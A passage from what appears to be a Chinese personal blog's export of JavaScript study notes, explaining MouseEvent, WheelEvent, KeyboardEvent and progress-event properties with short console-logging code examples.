<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;body onclick=&quot;showKey(event)&quot;&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showKey</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;ALT key pressed: &#x27;</span> + e.altKey);</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;CTRL key pressed: &#x27;</span> + e.ctrlKey);</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;META key pressed: &#x27;</span> + e.metaKey);</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;SHIFT key pressed: &#x27;</span> + e.shiftKey);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码中，点击网页会输出是否同时按下对应的键。</p>
<h5 id="4-3-2-MouseEvent-button，MouseEvent-buttons"><a href="#4-3-2-MouseEvent-button，MouseEvent-buttons" class="headerlink" title="4.3.2 MouseEvent.button，MouseEvent.buttons"></a>4.3.2 MouseEvent.button，MouseEvent.buttons</h5><p><code>MouseEvent.button</code>属性返回一个数值，表示事件发生时按下了鼠标的哪个键。该属性只读。</p>
<ul>
<li><p>0：按下主键（通常是左键），或者该事件没有初始化这个属性（比如<code>mousemove</code>事件）。</p>
</li>
<li><p>1：按下辅助键（通常是中键或者滚轮键）。</p>
</li>
<li><p>2：按下次键（通常是右键）。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码为</span></span><br><span class="line"><span class="comment">// &lt;button onmouseup=&quot;whichButton(event)&quot;&gt;点击&lt;/button&gt;</span></span><br><span class="line"><span class="keyword">var</span> whichButton = <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">switch</span> (e.button) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">&#x27;Left button clicked.&#x27;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">&#x27;Middle button clicked.&#x27;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">&#x27;Right button clicked.&#x27;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">&#x27;Unexpected code: &#x27;</span> + e.button);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>MouseEvent.buttons</code>属性返回一个三个比特位的值，表示同时按下了哪些键。它用来处理同时按下多个鼠标键的情况。该属性只读。</p>
</li>
<li><p>1：二进制为<code>001</code>（十进制的1），表示按下左键。</p>
</li>
<li><p>2：二进制为<code>010</code>（十进制的2），表示按下右键。</p>
</li>
<li><p>4：二进制为<code>100</code>（十进制的4），表示按下中键或滚轮键。</p>
</li>
</ul>
<p>同时按下多个键的时候，每个按下的键对应的比特位都会有值。比如，同时按下左键和右键，会返回3（二进制为011）。</p>
<h5 id="4-3-3-MouseEvent-clientX，MouseEvent-clientY"><a href="#4-3-3-MouseEvent-clientX，MouseEvent-clientY" class="headerlink" title="4.3.3 MouseEvent.clientX，MouseEvent.clientY"></a>4.3.3 MouseEvent.clientX，MouseEvent.clientY</h5><p><code>MouseEvent.clientX</code>属性返回鼠标位置相对于浏览器窗口左上角的水平坐标（单位像素），<code>MouseEvent.clientY</code>属性返回垂直坐标。这两个属性都是只读属性。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码为</span></span><br><span class="line"><span class="comment">// &lt;body onmousedown=&quot;showCoords(event)&quot;&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showCoords</span>(<span class="params">evt</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(</span><br><span class="line">    <span class="string">&#x27;clientX value: &#x27;</span> + evt.clientX + <span class="string">&#x27;\n&#x27;</span> +</span><br><span class="line">    <span class="string">&#x27;clientY value: &#x27;</span> + evt.clientY + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这两个属性还分别有一个别名<code>MouseEvent.x</code>和<code>MouseEvent.y</code>。</p>
<h5 id="4-3-4-MouseEvent-movementX，MouseEvent-movementY"><a href="#4-3-4-MouseEvent-movementX，MouseEvent-movementY" class="headerlink" title="4.3.4 MouseEvent.movementX，MouseEvent.movementY"></a>4.3.4 MouseEvent.movementX，MouseEvent.movementY</h5><p><code>MouseEvent.movementX</code>属性返回当前位置与上一个<code>mousemove</code>事件之间的水平距离（单位像素）。数值上，它等于下面的计算公式。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">currentEvent.movementX = currentEvent.screenX - previousEvent.screenX</span><br></pre></td></tr></table></figure>
<p><code>MouseEvent.movementY</code>属性返回当前位置与上一个<code>mousemove</code>事件之间的垂直距离（单位像素）。数值上，它等于下面的计算公式。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">currentEvent.movementY = currentEvent.screenY - previousEvent.screenY。</span><br></pre></td></tr></table></figure>
<p>这两个属性都是只读属性。</p>
<h5 id="4-3-5-MouseEvent-screenX，MouseEvent-screenY"><a href="#4-3-5-MouseEvent-screenX，MouseEvent-screenY" class="headerlink" title="4.3.5 MouseEvent.screenX，MouseEvent.screenY"></a>4.3.5 MouseEvent.screenX，MouseEvent.screenY</h5><p><code>MouseEvent.screenX</code>属性返回鼠标位置相对于屏幕左上角的水平坐标（单位像素），<code>MouseEvent.screenY</code>属性返回垂直坐标。这两个属性都是只读属性。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;body onmousedown=&quot;showCoords(event)&quot;&gt;</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showCoords</span>(<span class="params">evt</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(</span><br><span class="line">    <span class="string">&#x27;screenX value: &#x27;</span> + evt.screenX + <span class="string">&#x27;\n&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;screenY value: &#x27;</span> + evt.screenY + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="4-3-6-MouseEvent-offsetX，MouseEvent-offsetY"><a href="#4-3-6-MouseEvent-offsetX，MouseEvent-offsetY" class="headerlink" title="4.3.6 MouseEvent.offsetX，MouseEvent.offsetY"></a>4.3.6 MouseEvent.offsetX，MouseEvent.offsetY</h5><p><code>MouseEvent.offsetX</code>属性返回鼠标位置与目标节点左侧的<code>padding</code>边缘的水平距离（单位像素），<code>MouseEvent.offsetY</code>属性返回与目标节点上方的<code>padding</code>边缘的垂直距离。这两个属性都是只读属性。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* HTML 代码如下</span></span><br><span class="line"><span class="comment">  &lt;style&gt;</span></span><br><span class="line"><span class="comment">    p &#123;</span></span><br><span class="line"><span class="comment">      width: 100px;</span></span><br><span class="line"><span class="comment">      height: 100px;</span></span><br><span class="line"><span class="comment">      padding: 100px;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">  &lt;/style&gt;</span></span><br><span class="line"><span class="comment">  &lt;p&gt;Hello&lt;/p&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">var</span> p = <span class="built_in">document</span>.querySelector(<span class="string">&#x27;p&#x27;</span>);</span><br><span class="line">p.addEventListener(</span><br><span class="line">  <span class="string">&#x27;click&#x27;</span>,</span><br><span class="line">  <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(e.offsetX);</span><br><span class="line">    <span class="built_in">console</span>.log(e.offsetY);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="literal">false</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>上面代码中，鼠标如果在<code>p</code>元素的中心位置点击，会返回<code>150 150</code>。因此中心位置距离左侧和上方的<code>padding</code>边缘，等于<code>padding</code>的宽度（100像素）加上元素内容区域一半的宽度（50像素）。</p>
<h5 id="4-3-7-MouseEvent-pageX，MouseEvent-pageY"><a href="#4-3-7-MouseEvent-pageX，MouseEvent-pageY" class="headerlink" title="4.3.7 MouseEvent.pageX，MouseEvent.pageY"></a>4.3.7 MouseEvent.pageX，MouseEvent.pageY</h5><p><code>MouseEvent.pageX</code>属性返回鼠标位置与文档左侧边缘的距离（单位像素），<code>MouseEvent.pageY</code>属性返回与文档上侧边缘的距离（单位像素）。它们的返回值都包括文档不可见的部分。这两个属性都是只读。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* HTML 代码如下</span></span><br><span class="line"><span class="comment">  &lt;style&gt;</span></span><br><span class="line"><span class="comment">    body &#123;</span></span><br><span class="line"><span class="comment">      height: 2000px;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">  &lt;/style&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(</span><br><span class="line">  <span class="string">&#x27;click&#x27;</span>,</span><br><span class="line">  <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(e.pageX);</span><br><span class="line">    <span class="built_in">console</span>.log(e.pageY);</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="literal">false</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>上面代码中，页面高度为2000像素，会产生垂直滚动条。滚动到页面底部，点击鼠标输出的<code>pageY</code>值会接近2000。</p>
<h5 id="4-3-8-MouseEvent-relatedTarget"><a href="#4-3-8-MouseEvent-relatedTarget" class="headerlink" title="4.3.8 MouseEvent.relatedTarget"></a>4.3.8 MouseEvent.relatedTarget</h5><p><code>MouseEvent.relatedTarget</code>属性返回事件的相关节点。对于那些没有相关节点的事件，该属性返回<code>null</code>。该属性只读。</p>
<p>下表列出不同事件的<code>target</code>属性值和<code>relatedTarget</code>属性值义。<br>事件名称    target 属性    relatedTarget 属性<br>focusin        接受焦点的节点    丧失焦点的节点<br>focusout    丧失焦点的节点    接受焦点的节点<br>mouseenter    将要进入的节点    将要离开的节点<br>mouseleave    将要离开的节点    将要进入的节点<br>mouseout    将要离开的节点    将要进入的节点<br>mouseover    将要进入的节点    将要离开的节点<br>dragenter    将要进入的节点    将要离开的节点<br>dragexit    将要离开的节点    将要进入的节点<br>下面是一个例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  HTML 代码如下</span></span><br><span class="line"><span class="comment">  &lt;div id=&quot;outer&quot; style=&quot;height:50px;width:50px;border:1px solid black;&quot;&gt;</span></span><br><span class="line"><span class="comment">    &lt;div id=&quot;inner&quot; style=&quot;height:25px;width:25px;border:1px solid black;&quot;&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="comment">  &lt;/div&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> inner = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;inner&#x27;</span>);</span><br><span class="line">inner.addEventListener(<span class="string">&#x27;mouseover&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;进入&#x27;</span> + event.target.id + <span class="string">&#x27; 离开&#x27;</span> + event.relatedTarget.id);</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br><span class="line">inner.addEventListener(<span class="string">&#x27;mouseenter&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;进入&#x27;</span> + event.target.id + <span class="string">&#x27; 离开&#x27;</span> + event.relatedTarget.id);</span><br><span class="line">&#125;);</span><br><span class="line">inner.addEventListener(<span class="string">&#x27;mouseout&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;离开&#x27;</span> + event.target.id + <span class="string">&#x27; 进入&#x27;</span> + event.relatedTarget.id);</span><br><span class="line">&#125;);</span><br><span class="line">inner.addEventListener(<span class="string">&quot;mouseleave&quot;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;离开&#x27;</span> + event.target.id + <span class="string">&#x27; 进入&#x27;</span> + event.relatedTarget.id);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 鼠标从 outer 进入inner，输出</span></span><br><span class="line"><span class="comment">// 进入inner 离开outer</span></span><br><span class="line"><span class="comment">// 进入inner 离开outer</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 鼠标从 inner进入 outer，输出</span></span><br><span class="line"><span class="comment">// 离开inner 进入outer</span></span><br><span class="line"><span class="comment">// 离开inner 进入outer</span></span><br></pre></td></tr></table></figure>
<h4 id="4-4-MouseEvent-接口的实例方法"><a href="#4-4-MouseEvent-接口的实例方法" class="headerlink" title="4.4 MouseEvent 接口的实例方法"></a>4.4 MouseEvent 接口的实例方法</h4><h5 id="4-4-1-MouseEvent-getModifierState"><a href="#4-4-1-MouseEvent-getModifierState" class="headerlink" title="4.4.1 MouseEvent.getModifierState()"></a>4.4.1 MouseEvent.getModifierState()</h5><p><code>MouseEvent.getModifierState</code>方法返回一个布尔值，表示有没有按下特定的功能键。它的参数是一个表示功能键的字符串。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.addEventListener(<span class="string">&#x27;click&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(e.getModifierState(<span class="string">&#x27;CapsLock&#x27;</span>));</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
<p>上面的代码可以了解用户是否按下了大写键。</p>
<h4 id="4-5-WheelEvent-接口"><a href="#4-5-WheelEvent-接口" class="headerlink" title="4.5 WheelEvent 接口"></a>4.5 WheelEvent 接口</h4><h5 id="4-5-1-概述"><a href="#4-5-1-概述" class="headerlink" title="4.5.1 概述"></a>4.5.1 概述</h5><p>WheelEvent 接口继承了 MouseEvent 实例，代表鼠标滚轮事件的实例对象。目前，鼠标滚轮相关的事件只有一个<code>wheel</code>事件，用户滚动鼠标的滚轮，就生成这个事件的实例。</p>
<p>浏览器原生提供<code>WheelEvent()</code>构造函数，用来生成<code>WheelEvent</code>实例。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> wheelEvent = <span class="keyword">new</span> WheelEvent(type, options);</span><br></pre></td></tr></table></figure>
<p><code>WheelEvent()</code>构造函数可以接受两个参数，第一个是字符串，表示事件类型，对于滚轮事件来说，这个值目前只能是<code>wheel</code>。第二个参数是事件的配置对象。该对象的属性除了<code>Event</code>、<code>UIEvent</code>的配置属性以外，还可以接受以下几个属性，所有属性都是可选的。</p>
<ul>
<li><code>deltaX</code>：数值，表示滚轮的水平滚动量，默认值是 0.0。</li>
<li><code>deltaY</code>：数值，表示滚轮的垂直滚动量，默认值是 0.0。</li>
<li><code>deltaZ</code>：数值，表示滚轮的 Z 轴滚动量，默认值是 0.0。</li>
<li><code>deltaMode</code>：数值，表示相关的滚动事件的单位，适用于上面三个属性。0表示滚动单位为像素，1表示单位为行，2表示单位为页，默认为0。</li>
</ul>
<h5 id="4-5-2-实例属性"><a href="#4-5-2-实例属性" class="headerlink" title="4.5.2 实例属性"></a>4.5.2 实例属性</h5><p><code>WheelEvent</code>事件实例除了具有<code>Event</code>和<code>MouseEvent</code>的实例属性和实例方法，还有一些自己的实例属性，但是没有自己的实例方法。</p>
<p>下面的属性都是只读属性。</p>
<ul>
<li><code>WheelEvent.deltaX</code>：数值，表示滚轮的水平滚动量。</li>
<li><code>WheelEvent.deltaY</code>：数值，表示滚轮的垂直滚动量。</li>
<li><code>WheelEvent.deltaZ</code>：数值，表示滚轮的 Z 轴滚动量。</li>
<li><code>WheelEvent.deltaMode</code>：数值，表示上面三个属性的单位，0是像素，1是行，2是页。</li>
</ul>
<p><code>Well,that&#39;s all for today</code></p>
]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS 事件-鼠标事件</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0048</title>
    <url>/2021/05/29/%E6%89%93%E5%8D%A10048/</url>
    <content><![CDATA[<p><font color=#ef5b9c>在自称善意的之时，即存恶意。</font></p>
<h2 id="JS-事件"><a href="#JS-事件" class="headerlink" title="JS 事件"></a>JS 事件</h2><h3 id="5-键盘事件"><a href="#5-键盘事件" class="headerlink" title="5. 键盘事件"></a>5. 键盘事件</h3><h4 id="5-1-键盘事件的种类"><a href="#5-1-键盘事件的种类" class="headerlink" title="5.1 键盘事件的种类"></a>5.1 键盘事件的种类</h4><p>键盘事件由用户击打键盘触发，主要有<code>keydown</code>、<code>keypress</code>、<code>keyup</code>三个事件，它们都继承了<code>KeyboardEvent</code>接口。</p>
<ul>
<li><code>keydown</code>：按下键盘时触发。</li>
<li><code>keypress</code>：按下有值的键时触发，即按下 Ctrl、Alt、Shift、Meta 这样无值的键，这个事件不会触发。对于有值的键，按下时先触发keydown事件，再触发这个事件。</li>
<li><code>keyup</code>：松开键盘时触发该事件。</li>
</ul>
<p>如果用户一直按键不松开，就会连续触发键盘事件，触发的顺序如下。</p>
<ol>
<li>keydown</li>
<li>keypress</li>
<li>keydown</li>
<li>keypress</li>
<li>…（重复以上过程）</li>
<li>keyup</li>
</ol>
<span id="more"></span>
<h4 id="5-2-KeyboardEvent-接口概述"><a href="#5-2-KeyboardEvent-接口概述" class="headerlink" title="5.2 KeyboardEvent 接口概述"></a>5.2 KeyboardEvent 接口概述</h4><p><code>KeyboardEvent</code>接口用来描述用户与键盘的互动。这个接口继承了<code>Event</code>接口，并且定义了自己的实例属性和实例方法。</p>
<p>浏览器原生提供<code>KeyboardEvent</code>构造函数，用来新建键盘事件的实例。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> KeyboardEvent(type, options)</span><br></pre></td></tr></table></figure>
<p><code>KeyboardEvent</code>构造函数接受两个参数。第一个参数是字符串，表示事件类型；第二个参数是一个事件配置对象，该参数可选。除了<code>Event</code>接口提供的属性，还可以配置以下字段，它们都是可选。</p>
<ul>
<li><code>key</code>：字符串，当前按下的键，默认为空字符串。</li>
<li><code>code</code>：字符串，表示当前按下的键的字符串形式，默认为空字符串。</li>
<li><code>location</code>：整数，当前按下的键的位置，默认为<code>0</code>。</li>
<li><code>ctrlKey</code>：布尔值，是否按下 Ctrl 键，默认为<code>false</code>。</li>
<li><code>shiftKey</code>：布尔值，是否按下 Shift 键，默认为<code>false</code>。</li>
<li><code>altKey</code>：布尔值，是否按下 Alt 键，默认为<code>false</code>。</li>
<li><code>metaKey</code>：布尔值，是否按下 Meta 键，默认为<code>false</code>。</li>
<li><code>repeat</code>：布尔值，是否重复按键，默认为<code>false</code>。</li>
</ul>
<h4 id="5-3-KeyboardEvent-的实例属性"><a href="#5-3-KeyboardEvent-的实例属性" class="headerlink" title="5.3 KeyboardEvent 的实例属性"></a>5.3 KeyboardEvent 的实例属性</h4><h5 id="5-3-1-KeyboardEvent-altKey，KeyboardEvent-ctrlKey，KeyboardEvent-metaKey，KeyboardEvent-shiftKey"><a href="#5-3-1-KeyboardEvent-altKey，KeyboardEvent-ctrlKey，KeyboardEvent-metaKey，KeyboardEvent-shiftKey" class="headerlink" title="5.3.1 KeyboardEvent.altKey，KeyboardEvent.ctrlKey，KeyboardEvent.metaKey，KeyboardEvent.shiftKey"></a>5.3.1 KeyboardEvent.altKey，KeyboardEvent.ctrlKey，KeyboardEvent.metaKey，KeyboardEvent.shiftKey</h5><p>以下属性都是只读属性，返回一个布尔值，表示是否按下对应的键。</p>
<ul>
<li><code>KeyboardEvent.altKey</code>：是否按下 Alt 键</li>
<li><code>KeyboardEvent.ctrlKey</code>：是否按下 Ctrl 键</li>
<li><code>KeyboardEvent.metaKey</code>：是否按下 meta 键（Mac 系统是一个四瓣的小花，Windows 系统是 windows 键）</li>
<li><code>KeyboardEvent.shiftKey</code>：是否按下 Shift 键</li>
</ul>
<p>下面是一个示例。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">showChar</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;ALT: &#x27;</span> + e.altKey);</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;CTRL: &#x27;</span> + e.ctrlKey);</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;Meta: &#x27;</span> + e.metaKey);</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;Shift: &#x27;</span> + e.shiftKey);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.body.addEventListener(<span class="string">&#x27;keydown&#x27;</span>, showChar, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
<h5 id="5-3-2-KeyboardEvent-code"><a href="#5-3-2-KeyboardEvent-code" class="headerlink" title="5.3.2 KeyboardEvent.code"></a>5.3.2 KeyboardEvent.code</h5><p><code>KeyboardEvent.code</code>属性返回一个字符串，表示当前按下的键的字符串形式。该属性只读。</p>
<p>下面是一些常用键的字符串形式，其他键请查文档。</p>
<ul>
<li>数字键0 - 9：返回<code>digit0</code> - <code>digit9</code></li>
<li>字母键A - z：返回<code>KeyA</code> - <code>KeyZ</code></li>
<li>功能键F1 - F12：返回 <code>F1</code> - <code>F12</code></li>
<li>方向键：返回<code>ArrowDown</code>、<code>ArrowUp</code>、<code>ArrowLeft</code>、<code>ArrowRight</code></li>
<li>Alt 键：返回<code>AltLeft</code>或<code>AltRight</code></li>
<li>Shift 键：返回<code>ShiftLeft</code>或<code>ShiftRight</code></li>
<li>Ctrl 键：返回<code>ControlLeft</code>或<code>ControlRight</code></li>
</ul>
<h5 id="5-3-3-KeyboardEvent-key"><a href="#5-3-3-KeyboardEvent-key" class="headerlink" title="5.3.3 KeyboardEvent.key"></a>5.3.3 KeyboardEvent.key</h5><p><code>KeyboardEvent.key</code>属性返回一个字符串，表示按下的键名。该属性只读。</p>
<p>如果按下的键代表可打印字符，则返回这个字符，比如数字、字母。</p>
<p>如果按下的键代表不可打印的特殊字符，则返回预定义的键值，比如 Backspace，Tab，Enter，Shift，Control，Alt，CapsLock，Esc，Spacebar，PageUp，PageDown，End，Home，Left，Right，Up，Down，PrintScreen，Insert，Del，Win，F1～F12，NumLock，Scroll 等。</p>
<p>如果同时按下一个控制键和一个符号键，则返回符号键的键名。比如，按下 Ctrl + a，则返回<code>a</code>；按下 Shift + a，则返回大写的<code>A</code>。</p>
<p>如果无法识别键名，返回字符串<code>Unidentified</code>。</p>
<h5 id="5-3-4-KeyboardEvent-location"><a href="#5-3-4-KeyboardEvent-location" class="headerlink" title="5.3.4 KeyboardEvent.location"></a>5.3.4 KeyboardEvent.location</h5><p><code>KeyboardEvent.location</code>属性返回一个整数，表示按下的键处在键盘的哪一个区域。它可能取以下值。</p>
<ul>
<li>0：处在键盘的主区域，或者无法判断处于哪一个区域。</li>
<li>1：处在键盘的左侧，只适用那些有两个位置的键（比如 Ctrl 和 Shift 键）。</li>
<li>2：处在键盘的右侧，只适用那些有两个位置的键（比如 Ctrl 和 Shift 键）。</li>
<li>3：处在数字小键盘。</li>
</ul>
<h5 id="5-3-5-KeyboardEvent-repeat"><a href="#5-3-5-KeyboardEvent-repeat" class="headerlink" title="5.3.5 KeyboardEvent.repeat"></a>5.3.5 KeyboardEvent.repeat</h5><p><code>KeyboardEvent.repeat</code>返回一个布尔值，代表该键是否被按着不放，以便判断是否重复这个键，即浏览器会持续触发<code>keydown</code>和<code>keypress</code>事件，直到用户松开手为止。</p>
<h4 id="5-4-KeyboardEvent-的实例方法"><a href="#5-4-KeyboardEvent-的实例方法" class="headerlink" title="5.4 KeyboardEvent 的实例方法"></a>5.4 KeyboardEvent 的实例方法</h4><h5 id="5-4-1-KeyboardEvent-getModifierState"><a href="#5-4-1-KeyboardEvent-getModifierState" class="headerlink" title="5.4.1 KeyboardEvent.getModifierState()"></a>5.4.1 KeyboardEvent.getModifierState()</h5><p><code>KeyboardEvent.getModifierState()</code>方法返回一个布尔值，表示是否按下或激活指定的功能键。它的常用参数如下。</p>
<ul>
<li>Alt：Alt 键</li>
<li>CapsLock：大写锁定键</li>
<li>Control：Ctrl 键</li>
<li>Meta：Meta 键</li>
<li>NumLock：数字键盘开关键</li>
<li>Shift：Shift 键</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (</span><br><span class="line">  event.getModifierState(<span class="string">&#x27;Control&#x27;</span>) +</span><br><span class="line">  event.getModifierState(<span class="string">&#x27;Alt&#x27;</span>) +</span><br><span class="line">  event.getModifierState(<span class="string">&#x27;Meta&#x27;</span>) &gt; <span class="number">1</span></span><br><span class="line">) &#123;</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码表示，只要<code>Control</code>、<code>Alt</code>、<code>Meta</code>里面，同时按下任意两个或两个以上的键就返回。</p>
]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS 事件-键盘事件</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0049</title>
    <url>/2021/05/29/%E6%89%93%E5%8D%A10049/</url>
    <content><![CDATA[<p><font color=#deab8a>相逢尽道休官好，林下何曾见一人。</font></p>
<h2 id="JS-事件"><a href="#JS-事件" class="headerlink" title="JS 事件"></a>JS 事件</h2><h3 id="6-进度事件"><a href="#6-进度事件" class="headerlink" title="6. 进度事件"></a>6. 进度事件</h3><h4 id="6-1-进度事件的种类"><a href="#6-1-进度事件的种类" class="headerlink" title="6.1 进度事件的种类"></a>6.1 进度事件的种类</h4><p>进度事件用来描述资源加载的进度，主要由 AJAX 请求、<code>&lt;img&gt;</code>、<code>&lt;audio&gt;</code>、<code>&lt;video&gt;</code>、<code>&lt;style&gt;</code>、<code>&lt;link&gt;</code>等外部资源的加载触发，继承了<code>ProgressEvent</code>接口。它主要包含以下几种事件。</p>
<ul>
<li><code>abort</code>:外部资源中止加载时（比如用户取消）触发。如果发生错误导致中止，不会触发该事件。</li>
<li><code>error</code>:由于错误导致外部资源无法加载时触发。</li>
<li><code>load</code>:外部资源加载成功时触发。</li>
<li><code>loadstart</code>:外部资源开始加载时触发。</li>
<li><code>loadend</code>:外部资源停止加载时触发，发生顺序排在<code>error</code>、<code>abort</code>、<code>load</code>等事件的后面。</li>
<li><code>progress</code>:外部资源加载过程中不断触发。</li>
<li><code>timeout</code>:加载超时时触发。</li>
</ul>
<p>注意，除了资源下载，文件上传也存在这些事件。</p>
<span id="more"></span>
<p>下面是一个例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">image.addEventListener(<span class="string">&#x27;load&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">  image.classList.add(<span class="string">&#x27;finished&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">image.addEventListener(<span class="string">&#x27;error&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">  image.style.display = <span class="string">&#x27;none&#x27;</span>;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>上面代码在图片元素加载完成后，为图片元素添加一个<code>finished</code>的 Class。如果加载失败，就把图片元素的样式设置为不显示。</p>
<p>有时候，图片加载会在脚本运行之前就完成，尤其是当脚本放置在网页底部的时候，因此有可能<code>load</code>和<code>error</code>事件的监听函数根本不会执行。所以，比较可靠的方式，是用<code>complete</code>属性先判断一下是否加载完成。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">loaded</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (image.complete) &#123;</span><br><span class="line">  loaded();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  image.addEventListener(<span class="string">&#x27;load&#x27;</span>, loaded);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>由于 DOM 的元素节点没有提供是否加载错误的属性，所以<code>error</code>事件的监听函数最好放在<code>&lt;img&gt;</code>元素的 HTML 代码中，这样才能保证发生加载错误时百分之百会执行。</p>
